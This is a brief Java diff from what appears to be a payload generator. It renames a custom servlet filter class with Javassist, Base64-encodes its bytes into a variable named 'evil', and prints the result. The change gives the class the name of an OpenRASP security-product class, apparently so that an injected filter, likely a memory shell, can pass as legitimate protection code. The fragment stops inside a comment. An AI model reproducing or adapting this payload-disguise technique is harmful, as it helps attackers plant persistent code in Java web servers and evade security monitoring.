@@ -11,7 +11,7 @@ import java.util.Base64;
 public class Debug {
     public static void main(String[] args) {
         try{
-            byte[] evil = Javassist.ChangeClassName("com.sorry.bug.CustomFilter","org.apache.catalina.filters.AmazingFilter");
+            byte[] evil = Javassist.ChangeClassName("com.sorry.bug.CustomFilter","com.baidu.openrasp.InvokeFilter");
             String evil64 =  Base64.getEncoder().encodeToString(evil);
             System.out.println(evil64);
             /*
